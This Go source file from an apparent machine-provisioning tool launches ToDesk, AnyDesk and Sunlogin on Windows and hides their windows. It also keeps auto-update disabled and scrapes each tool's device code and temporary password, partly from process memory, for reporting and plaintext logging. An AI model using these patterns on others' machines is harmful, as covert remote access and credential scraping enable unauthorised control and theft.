// Package remotedesk 远程桌面软件管理
//
// 负责：
// 1. Windows 下启动 ToDesk / AnyDesk / 向日葵（不阻塞主进程）
// 2. 隐藏主窗口（仅隐藏，不关闭，保留托盘与临时密码）
// 3. 关闭 ToDesk 自动更新
// 4. 通过内置 rdpdump 采集各软件的地址与密码，供上报使用
package remotedesk

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"CloudInit/apppath"
	"CloudInit/logger"
	"CloudInit/rdpdump"
)

// RemoteInfo 单个远程桌面软件的连接信息
type RemoteInfo struct {
	Code     string `json:"code"`
	Password string `json:"password"`
}

// RDPInfo 所有远程桌面软件的连接信息
type RDPInfo struct {
	ToDesk   *RemoteInfo `json:"todesk,omitempty"`
	AnyDesk  *RemoteInfo `json:"anydesk,omitempty"`
	SunLogin *RemoteInfo `json:"sunlogin,omitempty"`
}

// Manager 远程桌面管理器
type Manager struct {
	mu       sync.Mutex
	toDesk   rdpdump.Info
	anyDesk  rdpdump.Info
	sunLogin rdpdump.Info

	running         int32
	done            chan struct{}
	refreshInterval int // 基础刷新间隔（秒）

	toolDir          string
	lastStartAttempt time.Time // 上次尝试启动 ToDesk 的时间
	lastUpdaterKill  time.Time // 上次清理 ToDesk 更新进程的时间
	lastSlowFetch    time.Time // 上次采集 AnyDesk/向日葵的时间
}

const (
	// slowFetchInterval AnyDesk / 向日葵 的采集间隔（内存扫描开销较大）
	slowFetchInterval = 5 * time.Minute
	// toDeskRestartWindow 自动拉起 ToDesk 的最小间隔
	toDeskRestartWindow = 10 * time.Minute
)

// New 创建远程桌面管理器
func New() *Manager {
	return &Manager{
		refreshInterval: 120,
		toolDir:         apppath.ToolDir(),
	}
}

// Start 启动远程桌面管理（仅 Windows 平台）
func (m *Manager) Start() {
	if runtime.GOOS != "windows" {
		logger.Infof("[远程桌面] 非Windows平台，跳过远程桌面管理")
		return
	}

	// 先关闭 ToDesk 自动更新，避免更新导致窗口关闭、临时密码失效
	m.disableToDeskAutoUpdate()

	m.startToDesk()
	m.startAnyDesk()
	m.startSunLogin()

	atomic.StoreInt32(&m.running, 1)
	m.done = make(chan struct{})
	go m.refreshLoop()

	logger.Infof("[远程桌面] 管理已启动，刷新间隔: %ds", m.refreshInterval)
}

// Stop 停止管理
func (m *Manager) Stop() {
	atomic.StoreInt32(&m.running, 0)
	if m.done == nil {
		return
	}
	select {
	case <-m.done:
	case <-time.After(5 * time.Second):
	}
}

// GetRDPInfo 获取待上报的远程桌面信息，全部为空时返回 nil
func (m *Manager) GetRDPInfo() *RDPInfo {
	m.mu.Lock()
	defer m.mu.Unlock()

	result := &RDPInfo{}
	if !m.toDesk.Empty() {
		result.ToDesk = &RemoteInfo{Code: m.toDesk.Code, Password: m.toDesk.Password}
	}
	if !m.anyDesk.Empty() {
		result.AnyDesk = &RemoteInfo{Code: m.anyDesk.Code, Password: m.anyDesk.Password}
	}
	if !m.sunLogin.Empty() {
		result.SunLogin = &RemoteInfo{Code: m.sunLogin.Code, Password: m.sunLogin.Password}
	}

	if result.ToDesk == nil && result.AnyDesk == nil && result.SunLogin == nil {
		return nil
	}
	return result
}

// startToDesk 启动 ToDesk.exe（不阻塞），启动后隐藏主窗口
func (m *Manager) startToDesk() {
	// 拉起前再确认一次自动更新已关闭（避免 ToDesk 退出时把配置改回去）
	m.disableToDeskAutoUpdate()

	m.mu.Lock()
	m.lastStartAttempt = time.Now()
	m.mu.Unlock()

	exePath := filepath.Join(m.toolDir, "ToDesk.exe")
	if _, err := os.Stat(exePath); err != nil {
		logger.Debugf("[ToDesk] ToDesk.exe不存在: %s", exePath)
		return
	}

	cmd := exec.Command(exePath)
	cmd.Dir = m.toolDir
	if err := cmd.Start(); err != nil {
		logger.Errorf("[ToDesk] 启动ToDesk.exe失败: %v", err)
		return
	}

	logger.Infof("[ToDesk] ToDesk.exe已启动: %s", exePath)
	go hideWindowsOfProcess("ToDesk.exe", 20)
}

// startAnyDesk 启动 AnyDesk.exe（不阻塞），启动后隐藏主窗口
func (m *Manager) startAnyDesk() {
	exePath := filepath.Join(m.toolDir, "AnyDesk.exe")
	if _, err := os.Stat(exePath); err != nil {
		logger.Debugf("[AnyDesk] AnyDesk.exe不存在: %s", exePath)
		return
	}

	cmd := exec.Command(exePath)
	cmd.Dir = m.toolDir
	if err := cmd.Start(); err != nil {
		logger.Errorf("[AnyDesk] 启动AnyDesk.exe失败: %v", err)
		return
	}

	logger.Infof("[AnyDesk] AnyDesk.exe已启动: %s", exePath)
	go hideWindowsOfProcess("AnyDesk.exe", 15)
}

// startSunLogin 启动向日葵（便携版/安装版，不阻塞）
func (m *Manager) startSunLogin() {
	exePath := findSunLoginExe(m.toolDir)
	if exePath == "" {
		logger.Debugf("[向日葵] 未找到向日葵客户端: %s", m.toolDir)
		return
	}

	cmd := exec.Command(exePath)
	cmd.Dir = m.toolDir
	if err := cmd.Start(); err != nil {
		logger.Errorf("[向日葵] 启动失败: %v", err)
		return
	}

	logger.Infof("[向日葵] 已启动: %s", exePath)
	go hideWindowsOfProcess("SunloginClient.exe", 30)
}

// findSunLoginExe 在工具目录中查找向日葵客户端
func findSunLoginExe(dir string) string {
	for _, name := range []string{
		"SunloginClient.exe",
		"SunLogin.exe",
		"SunloginClientPe.exe",
	} {
		path := filepath.Join(dir, name)
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return ""
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		lower := strings.ToLower(name)
		if !strings.HasSuffix(lower, ".exe") {
			continue
		}
		// 支持便携版单文件（文件名含“向日葵”）
		if strings.Contains(lower, "sunlogin") || strings.Contains(name, "向日葵") {
			return filepath.Join(dir, name)
		}
	}

	return ""
}

// refreshLoop 定期采集远程桌面信息
func (m *Manager) refreshLoop() {
	defer close(m.done)

	// 首次启动等待10秒让客户端完全启动
	time.Sleep(10 * time.Second)

	for atomic.LoadInt32(&m.running) == 1 {
		func() {
			defer func() {
				if r := recover(); r != nil {
					logger.Errorf("[远程桌面] 采集异常: %v", r)
				}
			}()

			// 每轮复查：ToDesk 可能在运行中把配置改回自动更新
			m.disableToDeskAutoUpdate()
			m.fetchToDesk()

			if time.Since(m.lastSlowFetch) >= slowFetchInterval {
				m.lastSlowFetch = time.Now()
				m.fetchAnyDesk()
				m.fetchSunLogin()
			}
		}()

		for i := 0; i < m.refreshInterval; i++ {
			if atomic.LoadInt32(&m.running) == 0 {
				return
			}
			time.Sleep(time.Second)
		}
	}
}

// fetchToDesk 采集 ToDesk 设备代码与临时密码
func (m *Manager) fetchToDesk() {
	info := rdpdump.ToDesk(m.toolDir)

	m.mu.Lock()
	if info.Code != "" {
		m.toDesk.Code = info.Code
	}
	if info.Password != "" {
		m.toDesk.Password = info.Password
	}
	if info.Version != "" {
		m.toDesk.Version = info.Version
	}
	code, password := m.toDesk.Code, m.toDesk.Password
	m.mu.Unlock()

	if code == "" && password == "" {
		logger.Warnf("[ToDesk] 未获取到设备代码或临时密码")
		m.restartToDeskIfNeeded()
		return
	}

	logger.Infof("[ToDesk] 设备代码: %s | 临时密码: %s", code, password)
}

// fetchAnyDesk 采集 AnyDesk 地址与密码
func (m *Manager) fetchAnyDesk() {
	info := rdpdump.AnyDesk(m.toolDir)
	if info.Empty() {
		logger.Debugf("[AnyDesk] 未获取到地址或密码")
		return
	}

	m.mu.Lock()
	if info.Code != "" {
		m.anyDesk.Code = info.Code
	}
	if info.Password != "" {
		m.anyDesk.Password = info.Password
	}
	code, password := m.anyDesk.Code, m.anyDesk.Password
	m.mu.Unlock()

	if password == "" {
		logger.Warnf("[AnyDesk] 已获取地址(%s)，未获取到密码，请检查被控端配置", code)
		return
	}
	logger.Infof("[AnyDesk] 地址: %s | 密码: %s", code, password)
}

// fetchSunLogin 采集向日葵识别码与验证码
func (m *Manager) fetchSunLogin() {
	info := rdpdump.SunLogin(m.toolDir)
	if info.Empty() {
		logger.Debugf("[向日葵] 未获取到识别码或验证码")
		return
	}

	m.mu.Lock()
	if info.Code != "" {
		m.sunLogin.Code = info.Code
	}
	if info.Password != "" {
		m.sunLogin.Password = info.Password
	}
	code, password := m.sunLogin.Code, m.sunLogin.Password
	m.mu.Unlock()

	if password == "" {
		logger.Warnf("[向日葵] 已获取识别码(%s)，未获取到验证码", code)
		return
	}
	logger.Infof("[向日葵] 识别码: %s | 验证码: %s", code, password)
}

// restartToDeskIfNeeded 检测到 ToDesk 进程缺失时尝试重新启动（限频）
func (m *Manager) restartToDeskIfNeeded() {
	if rdpdump.ProcessRunning("ToDesk.exe") {
		return
	}

	m.mu.Lock()
	if time.Since(m.lastStartAttempt) < toDeskRestartWindow {
		m.mu.Unlock()
		return
	}
	m.mu.Unlock()

	logger.Warnf("[ToDesk] 检测到ToDesk进程未运行，尝试重新启动")
	m.startToDesk()
}
